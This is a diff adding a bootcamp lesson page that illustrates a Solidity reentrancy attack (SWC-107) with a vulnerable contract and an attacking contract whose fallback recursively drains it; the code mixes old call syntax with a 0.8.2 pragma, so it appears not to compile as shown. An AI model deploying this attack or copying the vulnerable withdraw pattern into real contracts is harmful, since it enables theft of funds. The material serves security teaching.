@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=">
+  <link rel="stylesheet" href="../../../style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
+  <script src="../../../js/text-bounce.js" async></script>
+  <title>Welcome</title>
+</head>
+<div class="body">
+  
+  <h1>Reentrancy Example</h1>
+
+    <p>This set of contracts shows what a reentrancy attack (<a href="https://swcregistry.io/docs/SWC-107" target="_blank">SWC-107</a>) looks like.</p>
+  
+    <p>
+      <br>
+    </p><pre class="wrong">pragma solidity 0.8.2;
+// Example Reentrancy Attack
+  
+contract VulnerableContract {
+    mapping(address =&gt; uint) public balances;
+      
+    function deposit() public payable {
+        require(msg.value &gt; 1);
+        balances[msg.sender] += msg.value;
+    }
+      
+    function withdraw(uint _amount) public {
+        require(balances[msg.sender] &gt;= _amount, &quot;Not enough balance!&quot;);
+        msg.sender.call.value(_amount)(&quot;&quot;);
+        balances[msg.sender] -= _amount;
+    }
+      
+    function getBalance() view public returns(uint) {
+        return address(this).balance;
+    }
+      
+    fallback() payable external {}
+}
+  
+contract MaliciousContract {
+    VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);
+      
+    function deposit() public payable {
+        vulnerableContract.deposit.value(msg.value)();
+    }
+      
+    function withdraw() public {
+        vulnerableContract.withdraw(1 ether);
+    }
+      
+    function getBalance() view public returns(uint) {
+        return address(this).balance;
+    }
+      
+    fallback() payable external {
+        if(address(vulnerableContract).balance &gt; 1 ether) {
+            vulnerableContract.withdraw(1 ether);
+        }
+    }
+}
+</pre>
+
+  <!-- Be sure to alter the link below to add in correct Module and Lesson Number  -->
+    <div class="footer">
+      <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/main/S03-smart-contracts/M6-security/L2d-reentrancy-attack/index.html" target="_blank">Edit this page on Github</a>
+      
+      <div class="discord">
+        <img class="discord-logo" src="../../../img/discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
+      </div> 
+    </div>
+</div>
+
+</html>
